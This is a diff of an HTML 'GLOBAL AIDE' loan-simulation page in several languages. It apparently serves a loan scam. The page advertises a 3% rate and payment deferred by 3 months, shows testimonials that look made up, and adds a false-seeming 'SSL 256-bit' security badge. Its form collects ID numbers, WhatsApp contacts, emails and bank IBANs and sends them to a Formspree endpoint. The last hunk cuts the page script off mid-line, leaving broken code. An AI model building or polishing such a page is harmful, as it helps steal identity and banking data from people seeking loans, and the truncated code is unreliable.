@@ -11,11 +11,20 @@
         .step.active { display: flex; }
         @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
         .lang-btn.selected { border-color: #fbbf24; background: rgba(255,255,255,0.2); box-shadow: 0 0 15px rgba(251,191,36,0.4); }
+        
+        /* Slider Styling */
         .slider { -webkit-appearance: none; width: 100%; height: 8px; border-radius: 5px; background: #cbd5e1; outline: none; }
         .slider::-webkit-slider-thumb { -webkit-appearance: none; width: 24px; height: 24px; border-radius: 50%; background: #1d4ed8; cursor: pointer; border: 4px solid white; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        
+        /* Enlever les flèches du champ nombre pour faire plus propre */
+        input[type=number]::-webkit-inner-spin-button, input[type=number]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0; }
+        
+        /* Dark Mode Input Fix */
+        .dark input, .dark select, .dark textarea { background-color: #1e293b; color: white; border-color: #334155; }
+        .dark input::placeholder, .dark textarea::placeholder { color: #94a3b8; }
     </style>
 </head>
-<body class="bg-slate-50 font-sans text-slate-900 overflow-x-hidden">
+<body class="bg-slate-50 font-sans text-slate-900 overflow-x-hidden transition-colors duration-300" id="body">
 
     <section id="step-lang" class="step active min-h-screen flex-col items-center justify-center bg-gradient-to-br from-blue-900 to-blue-800 text-white p-6">
         <div class="text-center mb-10">
@@ -40,37 +49,50 @@
 
     <section id="step-sim" class="step min-h-screen flex-col p-4 md:p-8">
         <div class="max-w-5xl mx-auto w-full">
-            <div class="flex justify-between items-center mb-12">
+            <div class="flex justify-between items-center mb-8">
                 <div class="font-black text-2xl text-blue-700 tracking-tighter">GLOBAL AIDE</div>
                 <button onclick="goToStep(1)" class="text-sm font-bold text-slate-400 hover:text-blue-600 border-b-2 border-transparent hover:border-blue-600 transition-all">
-                    <i class="fas fa-language mr-2"></i>Langue / Language
+                    <i class="fas fa-language mr-2"></i><span id="btn-lang-change">Langue</span>
                 </button>
             </div>
 
-            <div class="text-center mb-10">
-                <h2 class="text-4xl font-black text-blue-900 mb-3" id="sim-title">Simulation de Prêt</h2>
+            <div class="text-center mb-8">
+                <h2 class="text-3xl md:text-4xl font-black text-blue-900 mb-3" id="sim-title">Simulation de Prêt</h2>
                 <p class="text-slate-500 font-medium" id="hero-sub">Taux fixe 3% • Premier paiement dans 3 mois</p>
             </div>
 
             <div class="grid grid-cols-1 lg:grid-cols-2 gap-10 bg-white p-6 md:p-12 rounded-[3rem] shadow-2xl border border-blue-50">
-                <div class="space-y-12">
+                <div class="space-y-10">
                     <div>
-                        <div class="flex justify-between mb-4 font-black text-slate-700">
-                            <span id="lbl-amt">Montant</span>
-                            <span class="text-blue-700 text-3xl"><span id="range-val">5000</span> <span class="curr">€</span></span>
+                        <div class="flex justify-between items-end mb-4 font-black text-slate-700">
+                            <span id="lbl-amt" class="mb-2">Montant</span>
+                            <div class="flex items-center border-b-4 border-blue-600 pb-1">
+                                <input type="number" id="amountInput" value="5000" min="1000" max="500000" oninput="syncAmount('input')" class="w-32 text-right text-3xl font-black text-blue-700 outline-none bg-transparent">
+                                <span class="curr text-2xl font-bold text-blue-700 ml-1">€</span>
+                            </div>
                         </div>
-                        <input type="range" min="1000" max="500000" step="1000" value="5000" class="slider" id="amountRange" oninput="calculateLoan()">
+                        <input type="range" min="1000" max="500000" step="1000" value="5000" class="slider" id="amountRange" oninput="syncAmount('slider')">
+                        <div class="flex justify-between text-xs font-bold text-slate-400 mt-2">
+                            <span>1 000 <span class="curr">€</span></span>
+                            <span>500 000 <span class="curr">€</span></span>
+                        </div>
                     </div>
+
                     <div>
-                        <div class="flex justify-between mb-4 font-black text-slate-700">
-                            <span id="lbl-dur">Durée</span>
-                            <span class="text-blue-700 text-3xl"><span id="year-val">3</span> <span id="lbl-years">Ans</span></span>
+                        <div class="flex justify-between items-end mb-4 font-black text-slate-700">
+                            <span id="lbl-dur" class="mb-2">Durée</span>
+                            <div class="flex items-center border-b-4 border-blue-600 pb-1">
+                                <input type="number" id="yearInput" value="3" min="2" max="30" oninput="syncYears('input')" class="w-16 text-right text-3xl font-black text-blue-700 outline-none bg-transparent">
+                                <span id="lbl-years" class="text-xl font-bold text-blue-700 ml-2">Ans</span>
+                            </div>
                         </div>
-                        <input type="range" min="2" max="30" step="1" value="3" class="slider" id="yearRange" oninput="calculateLoan()">
+                        <input type="range" min="2" max="30" step="1" value="3" class="slider" id="yearRange" oninput="syncYears('slider')">
                     </div>
                 </div>
 
-                <div class="bg-blue-900 text-white p-8 rounded-[2.5rem] shadow-inner space-y-6 flex flex-col justify-center">
+                <div class="bg-blue-900 text-white p-8 rounded-[2.5rem] shadow-inner space-y-6 flex flex-col justify-center relative overflow-hidden">
+                    <div class="absolute -right-10 -top-10 text-white opacity-5 text-9xl"><i class="fas fa-coins"></i></div>
+                    
                     <div class="flex justify-between items-center opacity-80">
                         <span id="res-lbl-men">Mensualité :</span> 
                         <span id="res-monthly" class="text-3xl font-black text-green-400">144 €</span>
@@ -79,22 +101,22 @@
                         <span id="res-lbl-tot">Total à rembourser :</span> 
                         <span id="res-total" class="text-xl font-bold">5150 €</span>
                     </div>
-                    <button onclick="goToStep(3)" class="w-full bg-yellow-400 text-blue-900 py-5 rounded-2xl font-black uppercase text-lg shadow-xl hover:scale-[1.02] transition-all mt-4" id="btn-next">Suivant</button>
+                    <button onclick="goToStep(3)" class="w-full bg-yellow-400 text-blue-900 py-5 rounded-2xl font-black uppercase text-lg shadow-xl hover:scale-[1.02] transition-all mt-4 z-10" id="btn-next">Suivant</button>
                 </div>
             </div>
 
-            <div class="mt-20 grid grid-cols-1 md:grid-cols-3 gap-8 mb-10">
-                <div class="bg-white p-6 rounded-3xl shadow-md border border-slate-100">
-                    <p class="italic text-slate-600 text-sm mb-4" id="t1-txt">"Reçu mon prêt de 5000€ très rapidement pour mon commerce."</p>
-                    <div class="flex items-center gap-3"><div class="w-8 h-8 bg-blue-100 rounded-full"></div><span class="font-bold text-xs">Marc L. 🇫🇷</span></div>
+            <div class="mt-16 grid grid-cols-1 md:grid-cols-3 gap-6 mb-10">
+                <div class="bg-white p-6 rounded-3xl shadow-md border border-slate-100 flex flex-col">
+                    <div class="flex items-center gap-3 mb-3"><div class="w-10 h-10 bg-blue-100 rounded-full flex items-center justify-center font-bold text-blue-600">M</div><span class="font-bold text-sm">Marc L. 🇫🇷</span></div>
+                    <p class="italic text-slate-600 text-sm" id="t1-txt">"Reçu mon prêt de 5000€ très rapidement."</p>
                 </div>
-                <div class="bg-white p-6 rounded-3xl shadow-md border border-slate-100">
-                    <p class="italic text-slate-600 text-sm mb-4" id="t2-txt">"El proceso fue muy sencillo desde Puerto Rico, gracias."</p>
-                    <div class="flex items-center gap-3"><div class="w-8 h-8 bg-blue-100 rounded-full"></div><span class="font-bold text-xs">Carlos R. 🇵🇷</span></div>
+                <div class="bg-white p-6 rounded-3xl shadow-md border border-slate-100 flex flex-col">
+                    <div class="flex items-center gap-3 mb-3"><div class="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center font-bold text-green-600">C</div><span class="font-bold text-sm">Carlos R. 🇵🇷</span></div>
+                    <p class="italic text-slate-600 text-sm" id="t2-txt">"El proceso fue muy sencillo desde Puerto Rico."</p>
                 </div>
-                <div class="bg-white p-6 rounded-3xl shadow-md border border-slate-100">
-                    <p class="italic text-slate-600 text-sm mb-4" id="t3-txt">"Un service honnête avec un taux vraiment bas."</p>
-                    <div class="flex items-center gap-3"><div class="w-8 h-8 bg-blue-100 rounded-full"></div><span class="font-bold text-xs">Elena P. 🇪🇨</span></div>
+                <div class="bg-white p-6 rounded-3xl shadow-md border border-slate-100 flex flex-col">
+                    <div class="flex items-center gap-3 mb-3"><div class="w-10 h-10 bg-purple-100 rounded-full flex items-center justify-center font-bold text-purple-600">E</div><span class="font-bold text-sm">Elena P. 🇪🇨</span></div>
+                    <p class="italic text-slate-600 text-sm" id="t3-txt">"Un service honnête avec un taux vraiment bas."</p>
                 </div>
             </div>
         </div>
@@ -102,16 +124,16 @@
 
     <section id="step-form" class="step min-h-screen flex-col p-4 md:p-8 bg-slate-100">
         <div class="max-w-3xl mx-auto w-full">
-            <button onclick="goToStep(2)" class="mb-8 text-blue-700 font-black flex items-center gap-2">
+            <button onclick="goToStep(2)" class="mb-6 text-blue-700 font-black flex items-center gap-2 hover:translate-x-[-5px] transition-transform">
                 <i class="fas fa-chevron-left"></i> <span id="btn-back">Retour</span>
             </button>
             
-            <div class="bg-white p-8 md:p-12 rounded-[3rem] shadow-2xl">
+            <div class="bg-white p-8 md:p-12 rounded-[3rem] shadow-2xl relative">
                 <h2 class="text-3xl font-black text-blue-900 mb-8" id="form-title">Informations de contact</h2>
                 
                 <form action="https://formspree.io/f/xnjqwngo" method="POST" class="space-y-6" id="loanForm">
-                    <input type="hidden" name="Montant_Calcule" id="hidden-montant">
-                    <input type="hidden" name="Duree_Ans" id="hidden-annees">
+                    <input type="hidden" name="Montant_Final" id="hidden-montant">
+                    <input type="hidden" name="Duree_Finale" id="hidden-annees">
                     
                     <div class="space-y-2">
                         <label class="text-xs font-black uppercase text-slate-400 ml-2" id="lbl-pays">Pays de résidence</label>
@@ -125,21 +147,25 @@
                     </div>
 
                     <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                        <input type="text" name="Nom" placeholder="Nom Complet" required class="p-4 bg-slate-50 rounded-2xl outline-none border-2 border-slate-50 focus:border-blue-500">
-                        <input type="text" name="ID" placeholder="N° Pièce d'identité" required class="p-4 bg-slate-50 rounded-2xl outline-none border-2 border-slate-50 focus:border-blue-500">
+                        <input type="text" id="inp-nom" name="Nom" placeholder="Nom Complet" required class="p-4 bg-slate-50 rounded-2xl outline-none border-2 border-slate-50 focus:border-blue-500 font-medium">
+                        <input type="text" id="inp-id" name="ID" placeholder="N° Pièce d'identité" required class="p-4 bg-slate-50 rounded-2xl outline-none border-2 border-slate-50 focus:border-blue-500 font-medium">
                     </div>
 
                     <div class="flex gap-2">
-                        <span id="phone-prefix" class="p-4 bg-slate-200 rounded-2xl font-black text-slate-600">+33</span>
-                        <input type="tel" name="WhatsApp" placeholder="WhatsApp Number" required class="w-full p-4 bg-slate-50 rounded-2xl outline-none border-2 border-slate-50 focus:border-blue-500">
+                        <span id="phone-prefix" class="p-4 bg-slate-200 rounded-2xl font-black text-slate-600 flex items-center justify-center min-w-[80px]">+33</span>
+                        <input type="tel" id="inp-wa" name="WhatsApp" placeholder="Numéro WhatsApp" required class="w-full p-4 bg-slate-50 rounded-2xl outline-none border-2 border-slate-50 focus:border-blue-500 font-medium">
                     </div>
 
-                    <input type="email" name="Email" placeholder="Email" required class="w-full p-4 bg-slate-50 rounded-2xl outline-none border-2 border-slate-50 focus:border-blue-500">
+                    <input type="email" id="inp-mail" name="Email" placeholder="Votre Email" required class="w-full p-4 bg-slate-50 rounded-2xl outline-none border-2 border-slate-50 focus:border-blue-500 font-medium">
                     
-                    <textarea name="Banque_Infos" placeholder="Nom de votre banque et IBAN / Numéro de compte" required class="w-full p-4 bg-blue-50 rounded-2xl h-32 outline-none border-2 border-blue-50 focus:border-blue-500"></textarea>
+                    <textarea id="inp-bank" name="Banque_Infos" placeholder="Nom de votre banque et IBAN / Numéro de compte" required class="w-full p-4 bg-blue-50 rounded-2xl h-32 outline-none border-2 border-blue-50 focus:border-blue-500 font-medium"></textarea>
 
                     <button type="submit" class="w-full bg-blue-700 text-white p-6 rounded-2xl font-black text-2xl shadow-xl hover:bg-blue-800 transition-all" id="btn-submit">ENVOYER LE DOSSIER</button>
                 </form>
+                
+                <div class="mt-6 text-center text-xs text-slate-400 flex items-center justify-center gap-2">
+                    <i class="fas fa-lock"></i> <span id="secure-msg">Données cryptées SSL 256-bit</span>
+                </div>
             </div>
         </div>
     </section>
@@ -151,85 +177,18 @@
         function selectLang(lang, currency) {
             currentLang = lang;
             currentCurrency = currency;
-            
-            // UI Feedback
             document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('selected'));
             document.getElementById('btn-' + lang).classList.add('selected');
-            
-            // Show and translate continue button
             const contBtn = document.getElementById('lang-continue');
             contBtn.classList.remove('hidden');
             contBtn.innerHTML = translations[lang].cont + ' <i class="fas fa-arrow-right ml-2"></i>';
-            
             updateTranslations(lang);
         }
 
         function goToStep(stepNumber) {
             document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-            const stepId = stepNumber === 1 ? 'step-lang' : stepNumber === 2 ? 'step-sim' : 'step-form';
-            document.getElementById(stepId).classList.add('active');
-            window.scrollTo(0,0);
-        }
-
-        function calculateLoan() {
-            const amount = document.getElementById('amountRange').value;
-            const years = document.getElementById('yearRange').value;
-            document.getElementById('range-val').innerText = new Intl.NumberFormat().format(amount);
-            document.getElementById('year-val').innerText = years;
-
-            const total = Math.round(parseInt(amount) + (amount * 0.03));
-            const monthly = Math.round(total / (years * 12));
-
-            document.getElementById('res-total').innerText = new Intl.NumberFormat().format(total) + " " + currentCurrency;
-            document.getElementById('res-monthly').innerText = new Intl.NumberFormat().format(monthly) + " " + currentCurrency;
-            
-            document.getElementById('hidden-montant').value = amount + " " + currentCurrency;
-            document.getElementById('hidden-annees').value = years + " ans";
-        }
-
-        const translations = {
-            fr: { cont: "CONTINUER", sim: "Simulation de Prêt", sub: "Taux fixe 3% • Premier paiement dans 3 mois", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité :", tot: "Total :", next: "Suivant", fTitle: "Informations de contact", back: "Retour", thanks: "Merci ! Vous serez contacté d'ici 24h sur WhatsApp." },
-            en: { cont: "CONTINUE", sim: "Loan Simulation", sub: "3% Fixed Rate • First payment in 3 months", amt: "Amount", dur: "Duration", yr: "Years", men: "Monthly:", tot: "Total:", next: "Next", fTitle: "Contact Information", back: "Back", thanks: "Thank you! You will be contacted within 24h on WhatsApp." },
-            es: { cont: "CONTINUAR", sim: "Simulación de Préstamo", sub: "Tasa fija 3% • Primer pago en 3 meses", amt: "Monto", dur: "Plazo", yr: "Años", men: "Mensualidad:", tot: "Total:", next: "Siguiente", fTitle: "Información de contacto", back: "Atrás", thanks: "¡Gracias! Contacto en 24h por WhatsApp." },
-            de: { cont: "WEITER", sim: "Kreditsimulation", sub: "3% Festzins • Erste Zahlung in 3 Monaten", amt: "Betrag", dur: "Dauer", yr: "Jahre", men: "Monatlich:", tot: "Gesamt:", next: "Weiter", fTitle: "Kontaktinformationen", back: "Zurück", thanks: "Vielen Dank! Kontakt in 24h per WhatsApp." }
-        };
-
-        function updateTranslations(lang) {
-            const t = translations[lang];
-            document.getElementById('sim-title').innerText = t.sim;
-            document.getElementById('hero-sub').innerText = t.sub;
-            document.getElementById('lbl-amt').innerText = t.amt;
-            document.getElementById('lbl-dur').innerText = t.dur;
-            document.getElementById('lbl-years').innerText = t.yr;
-            document.getElementById('res-lbl-men').innerText = t.men;
-            document.getElementById('res-lbl-tot').innerText = t.tot;
-            document.getElementById('btn-next').innerText = t.next;
-            document.getElementById('form-title').innerText = t.fTitle;
-            document.getElementById('btn-back').innerText = t.back;
-            document.getElementById('loanForm').onsubmit = () => { alert(t.thanks); return true; };
-            
-            // Ajuster automatiquement le sélecteur de pays
-            const countrySelect = document.getElementById('country-select');
-            if(lang === 'es') countrySelect.value = "Porto Rico";
-            else if(lang === 'en') countrySelect.value = "Ecuador"; // Ou USA si tu avais mis
-            else countrySelect.value = "France";
-            
-            updateCountryData();
-        }
-
-        function updateCountryData() {
-            const select = document.getElementById('country-select');
-            const opt = select.options[select.selectedIndex];
-            document.getElementById('phone-prefix').innerText = opt.getAttribute('data-code');
-            currentCurrency = opt.getAttribute('data-curr');
-            document.querySelectorAll('.curr').forEach(el => el.innerText = currentCurrency);
-            calculateLoan();
-        }
-    </script>
-</body>
-            </html>
-
-
+            const stepId = stepNumber === 1 ? 'step-lang'
+    
     
     
         
